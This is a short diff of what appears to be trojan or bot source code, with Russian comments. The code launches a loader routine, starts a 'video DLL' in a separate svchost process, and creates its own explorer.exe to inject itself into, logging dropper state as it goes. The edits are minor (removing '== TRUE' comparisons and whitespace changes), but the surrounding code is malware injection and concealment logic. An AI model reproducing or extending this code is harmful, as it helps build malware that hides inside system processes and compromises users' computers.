@@ -132,14 +132,14 @@ bool RunLoaderRoutine()
 		return MegaJump( LoaderRoutine ) == TRUE;
 	return true;
 #else
-	return MegaJump( LoaderRoutine ) == TRUE;
+	return MegaJump( LoaderRoutine );
 #endif
 }
 
 bool RunVideoProcess()
 {
 	MDBG( "Main", "Запуск видеодлл в отдельном свцхосте" );
-	return MegaJump( VideoProcess::StartSvchost ) == TRUE;
+	return MegaJump( VideoProcess::StartSvchost );
 }
 
 DWORD WINAPI LoaderRoutine( LPVOID lpData )
@@ -450,8 +450,7 @@ int APIENTRY MyMain()
 		// Обычный запуск exe бота
 		MDBG( "Main", "В процессе [IsDropper=%d] %s, %08x", IsDropper, DropperFileName, dwProcessHash2 );
 		InjectedInSelfExplorer = TRUE;
-		
-		// Запускаем свой эксплорер и инжектимся в него
+	    // Запускаем свой эксплорер и инжектимся в него
 		if (!JmpToExplorer(ExplorerRoutine))
 		{
 			MDBG( "Main", "Ошиька создания эксплорера и инжекта в него");
